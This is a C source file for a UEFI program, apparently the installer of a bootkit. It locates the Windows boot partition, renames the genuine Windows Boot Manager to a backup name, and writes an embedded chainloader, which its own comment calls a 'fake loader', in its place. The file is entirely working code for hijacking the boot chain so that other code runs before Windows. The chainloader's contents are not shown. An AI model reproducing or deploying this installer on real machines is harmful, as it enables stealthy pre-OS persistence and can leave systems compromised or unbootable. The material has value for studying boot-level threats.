#include "installer.h"


CHAR16 *OriginalLoader = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
CHAR16 *BackupLoader   = L"\\EFI\\Microsoft\\Boot\\bootmgfw_ms.efi";

extern unsigned char chainloader_efi[];
extern unsigned int chainloader_efi_len;

int mainInstall() {
    //finding partition with windows
    EFI_HANDLE partitionHandle = findPartition(OriginalLoader);
    if(partitionHandle == NULL) return 1;
    
    EFI_FILE_PROTOCOL* root = openRoot(partitionHandle);
    if(root == NULL) return 1;
    //renaming of loader
    EFI_STATUS status = renameFile(root, OriginalLoader, BackupLoader);

    if(EFI_ERROR(status)) return 1;
    printf("Zmiana nazwy udana\n");

    //creating fake loader
    UINTN realSize = (UINTN)chainloader_efi_len;
    BS->Stall(5000000);
    status = writeFileToRoot(root, OriginalLoader, chainloader_efi, realSize);

    root->Close(root);

    return EFI_ERROR(status) ? 1 : 0;
}

EFI_HANDLE findPartition(CHAR16 *fileName) {
    EFI_GUID file_guid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;
    EFI_HANDLE *handle_buffer;
    UINTN handle_count;
    EFI_STATUS status = BS->LocateHandleBuffer(
        ByProtocol,
        &file_guid,
        NULL,
        &handle_count,
        &handle_buffer
    );
    if(EFI_ERROR(status)) return NULL;
    for(int i=0;i<handle_count;i++) {
        EFI_FILE_PROTOCOL *root = openRoot(handle_buffer[i]);
        if (!root) continue;
        EFI_FILE_PROTOCOL *target = openFile(root,fileName, EFI_FILE_MODE_READ);
        if(target) {
            target->Close(target);

            EFI_HANDLE result_handle = handle_buffer[i];
            BS->FreePool(handle_buffer);
            return result_handle;
        }
        root->Close(root);
        
    }
    BS->FreePool(handle_buffer);
    return NULL;
}

EFI_FILE_PROTOCOL* openRoot(EFI_HANDLE handle) {
    EFI_GUID file_guid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *file_protocol = NULL;
    EFI_FILE_PROTOCOL *root = NULL;

    EFI_STATUS status = BS->OpenProtocol(
        handle,
        &file_guid,
        (void**)&file_protocol,
        IM,
        NULL,
        EFI_OPEN_PROTOCOL_GET_PROTOCOL
    );
    if(EFI_ERROR(status)) return NULL;

    
    status = file_protocol->OpenVolume(
        file_protocol,
        &root
    );
    if(EFI_ERROR(status)) return NULL;

    return root;

}


EFI_FILE_PROTOCOL* openFile(EFI_FILE_PROTOCOL *root, CHAR16 *path, UINT64 mode) {
    EFI_FILE_PROTOCOL *target_file = NULL;
    EFI_STATUS status = root->Open(
        root,
        &target_file,
        path,
        mode,
        0
    );
    if(status == EFI_SUCCESS){
        return target_file;
    } 
    return NULL;

}

EFI_STATUS renameFile(EFI_FILE_PROTOCOL *root,CHAR16 *oldName, CHAR16 *newName){  
    EFI_FILE_PROTOCOL *file = openFile(root,oldName, EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE);

    if (file == NULL) return EFI_NOT_FOUND;

    UINTN infoSize = sizeof(EFI_FILE_INFO) + 100;
    EFI_FILE_INFO *info = NULL;

    EFI_STATUS status = BS->AllocatePool(EfiLoaderData,infoSize,(VOID**)&info);
    if (EFI_ERROR(status)) {
        file->Close(file);
        return status;
    }

    EFI_GUID file_guid = EFI_FILE_INFO_GUID;
    status = file->GetInfo(
        file,
        &file_guid,
        &infoSize,
        info
    );
    if (EFI_ERROR(status)) {
        BS->FreePool(info);
        file->Close(file);
        return status;
    }

    UINTN i =0;
    for(i=0; newName[i] != 0; i++) info->FileName[i] = newName[i];
    info->FileName[i] = 0;

    info->Size = sizeof(EFI_FILE_INFO) + (i * 2);

    status = file->SetInfo(
        file,
        &file_guid,
        &infoSize,
        info
    );

    BS->FreePool(info);
    file->Close(file);
    return status;
}

EFI_STATUS writeFileToRoot(EFI_FILE_PROTOCOL *root, CHAR16 *fileName, VOID *buffer, UINTN size) {
    EFI_FILE_PROTOCOL *file = NULL;
    EFI_STATUS status = root->Open(
        root, 
        &file,
        fileName,
        EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE,
        0
    );
    if(EFI_ERROR(status)) return status;

    status = file->Write(file, &size, buffer);
    if(EFI_ERROR(status)) return status;

    file->Close(file);
    return status;

}

